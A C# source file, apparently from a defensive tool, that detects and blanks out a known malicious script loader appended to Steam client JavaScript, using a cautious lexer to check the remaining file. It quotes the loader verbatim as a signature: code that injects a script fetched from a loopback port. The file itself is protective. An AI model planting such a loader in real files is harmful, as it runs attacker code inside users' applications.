using System.Text;

namespace SteamSentinel.Core.Inspection;

/// <summary>
/// Removes only the observed SteamAlert EOF loader. The source-map comment overwritten
/// by the sample cannot be reconstructed from the modified file.
/// </summary>
public static class SteamScriptRepair
{
    public const string RuleId = "STEAMALERT-UI-INJECTION";
    public const int MaximumBytes = 32 * 1024 * 1024;
    private static readonly UTF8Encoding StrictUtf8 = new(false, true);
    private static ReadOnlySpan<byte> Loader =>
        ";try{var s=document.createElement(\"script\");s.src=\"http://127.0.0.1:8137/x.js?\"+Date.now();document.head.append(s)}catch{}"u8;

    public static bool TryRepair(ReadOnlySpan<byte> original, out byte[] repaired)
    {
        repaired = [];
        if (original.Length > MaximumBytes) return false;
        int offset = original.IndexOf(Loader);
        if (offset < 2 || original[offset - 1] != (byte)'\n') return false;
        ReadOnlySpan<byte> tail = original[(offset + Loader.Length)..];
        foreach (byte value in tail)
            if (value != (byte)' ') return false;
        string prefix;
        try { prefix = StrictUtf8.GetString(original[..offset]); }
        catch (DecoderFallbackException) { return false; }
        // Another family marker or literal loopback loader means the single supported edit
        // cannot establish that the remaining file has no second injection.
        if (prefix.Contains("127.0.0.1:8137/x.js", StringComparison.Ordinal) ||
            prefix.Contains("/x.js?", StringComparison.Ordinal) ||
            SteamUiLoopbackInspector.Find(prefix) is not null || !HasCompletePrefix(prefix)) return false;
        repaired = original.ToArray();
        repaired.AsSpan(offset, Loader.Length).Fill((byte)' ');
        return true;
    }

    private readonly record struct Delimiter(char Kind, bool Control = false);

    // A conservative lexer establishes that the suffix begins in code with all delimiters
    // closed. Ambiguous slash-after-brace syntax and unsupported identifier escapes require manual review.
    // Literal bodies are never interpreted or evaluated.
    private static bool HasCompletePrefix(string text)
    {
        ReadOnlySpan<char> input = text;
        Span<Delimiter> delimiters = stackalloc Delimiter[256];
        int depth = 0, position = input.StartsWith("\uFEFF", StringComparison.Ordinal) ? 1 : 0;
        bool canEnd = false, regexAllowed = true, ambiguousSlash = false, control = false;
        while (position < input.Length)
        {
            char ch = input[position++];
            if (char.IsWhiteSpace(ch)) continue;
            if (ch == '/' && position < input.Length && input[position] == '/')
            {
                while (position < input.Length && !IsLineEnd(input[position])) position++;
                continue;
            }
            if (ch == '/' && position < input.Length && input[position] == '*')
            {
                int end = input[(position + 1)..].IndexOf("*/", StringComparison.Ordinal);
                if (end < 0) return false;
                position += end + 3;
                continue;
            }
            if (ch is '\'' or '"')
            {
                if (!ReadString(input, ref position, ch)) return false;
                canEnd = true; regexAllowed = false; ambiguousSlash = false; control = false;
                continue;
            }
            if (ch == (char)0x60)
            {
                if (!ReadTemplate(input, ref position, out bool expression)) return false;
                if (expression)
                {
                    if (depth == delimiters.Length) return false;
                    delimiters[depth++] = new('T');
                }
                canEnd = !expression; regexAllowed = expression; ambiguousSlash = false; control = false;
                continue;
            }
            if (ch == '/')
            {
                if (ambiguousSlash) return false;
                if (regexAllowed)
                {
                    if (!ReadRegex(input, ref position)) return false;
                    canEnd = true; regexAllowed = false;
                }
                else { canEnd = false; regexAllowed = true; }
                control = false;
                continue;
            }
            if (IsIdentifierStart(ch) || ch == '\\')
            {
                int start = position - 1;
                if (!ReadIdentifier(input, start, ref position, out string? decoded)) return false;
                ReadOnlySpan<char> word = decoded is null ? input[start..position] : decoded;
                control = word is "if" or "while" or "for" or "switch" or "with" or "catch";
                regexAllowed = control || word is "return" or "throw" or "case" or "delete" or "void" or "typeof" or
                    "new" or "yield" or "await" or "in" or "instanceof" or "else" or "do";
                canEnd = !regexAllowed && word is not ("var" or "let" or "const" or "function" or "class" or "extends");
                ambiguousSlash = false;
                continue;
            }
            if (char.IsAsciiDigit(ch) || ch == '.' && position < input.Length && char.IsAsciiDigit(input[position]))
            {
                while (position < input.Length && (char.IsAsciiLetterOrDigit(input[position]) || input[position] is '.' or '_')) position++;
                canEnd = true; regexAllowed = false; ambiguousSlash = false; control = false;
                continue;
            }
            if (ch is '(' or '[' or '{')
            {
                if (depth == delimiters.Length) return false;
                delimiters[depth++] = new(ch, ch == '(' && control);
                canEnd = false; regexAllowed = true; ambiguousSlash = false; control = false;
                continue;
            }
            if (ch is ')' or ']' or '}')
            {
                if (depth == 0) return false;
                Delimiter opening = delimiters[--depth];
                if (opening.Kind == 'T' && ch == '}')
                {
                    if (!ReadTemplate(input, ref position, out bool expression)) return false;
                    if (expression) delimiters[depth++] = new('T');
                    canEnd = !expression; regexAllowed = expression; ambiguousSlash = false;
                }
                else
                {
                    if ((opening.Kind, ch) is not (('(', ')') or ('[', ']') or ('{', '}'))) return false;
                    canEnd = !opening.Control;
                    regexAllowed = opening.Control;
                    ambiguousSlash = ch == '}';
                }
                control = false;
                continue;
            }
            control = false;
            ambiguousSlash = false;
            if (ch == ';') { canEnd = true; regexAllowed = true; continue; }
            if (ch is '+' or '-' && position < input.Length && input[position] == ch)
            {
                position++;
                canEnd = !regexAllowed; // A postfix increment can end an expression.
                continue;
            }
            if (ch is '=' or ',' or ':' or '?' or '.' or '!' or '~' or '+' or '-' or '*' or '%' or '&' or '|' or '^' or '<' or '>')
            {
                canEnd = false; regexAllowed = true;
                continue;
            }
            return false;
        }
        return depth == 0 && canEnd;
    }

    private static bool IsLineEnd(char ch) => ch is '\r' or '\n' or '\u2028' or '\u2029';
    private static bool IsIdentifierStart(char ch) => char.IsLetter(ch) || ch is '_' or '$';
    private static bool IsIdentifierPart(char ch) => IsIdentifierStart(ch) || char.IsDigit(ch);

    // Steam's minified keyboard tables contain object keys such as \u3131. Decode
    // only complete four-digit escapes with valid identifier characters. Keywords
    // must use the decoded spelling so escapes cannot change slash/control context.
    private static bool ReadIdentifier(ReadOnlySpan<char> input, int start, ref int position, out string? word)
    {
        word = null;
        StringBuilder? decoded = null;
        position = start;
        bool first = true;
        while (position < input.Length)
        {
            char ch = input[position];
            if (ch == '\\')
            {
                int escape = position++;
                if (input.Length - position < 5 || input[position++] != 'u') return false;
                int value = 0;
                for (int index = 0; index < 4; index++)
                {
                    int digit = input[position++] switch
                    {
                        >= '0' and <= '9' and var digitChar => digitChar - '0',
                        >= 'a' and <= 'f' and var digitChar => digitChar - 'a' + 10,
                        >= 'A' and <= 'F' and var digitChar => digitChar - 'A' + 10,
                        _ => -1
                    };
                    if (digit < 0) return false;
                    value = value * 16 + digit;
                }
                ch = (char)value;
                if (!(first ? IsIdentifierStart(ch) : IsIdentifierPart(ch))) return false;
                decoded ??= new StringBuilder(input[start..escape].ToString());
                decoded.Append(ch);
            }
            else
            {
                if (!(first ? IsIdentifierStart(ch) : IsIdentifierPart(ch))) break;
                position++;
                decoded?.Append(ch);
            }
            first = false;
        }
        word = decoded?.ToString();
        return !first;
    }

    private static bool ReadString(ReadOnlySpan<char> input, ref int position, char quote)
    {
        while (position < input.Length)
        {
            char ch = input[position++];
            if (ch == quote) return true;
            if (ch == '\\')
            {
                if (position == input.Length) return false;
                char escaped = input[position++];
                if (escaped == '\r' && position < input.Length && input[position] == '\n') position++;
            }
            else if (IsLineEnd(ch)) return false;
        }
        return false;
    }

    // Stop at interpolation start. One delimiter stack handles nested templates and code.
    private static bool ReadTemplate(ReadOnlySpan<char> input, ref int position, out bool expression)
    {
        expression = false;
        while (position < input.Length)
        {
            char ch = input[position++];
            if (ch == (char)0x60) return true;
            if (ch == '\\')
            {
                if (position == input.Length) return false;
                position++;
            }
            else if (ch == '$' && position < input.Length && input[position] == '{')
            {
                position++; expression = true; return true;
            }
        }
        return false;
    }

    private static bool ReadRegex(ReadOnlySpan<char> input, ref int position)
    {
        bool characterClass = false;
        while (position < input.Length)
        {
            char ch = input[position++];
            if (IsLineEnd(ch)) return false;
            if (ch == '\\')
            {
                if (position == input.Length || IsLineEnd(input[position++])) return false;
            }
            else if (ch == '[') characterClass = true;
            else if (ch == ']') characterClass = false;
            else if (ch == '/' && !characterClass)
            {
                while (position < input.Length && IsIdentifierPart(input[position])) position++;
                return true;
            }
        }
        return false;
    }
}
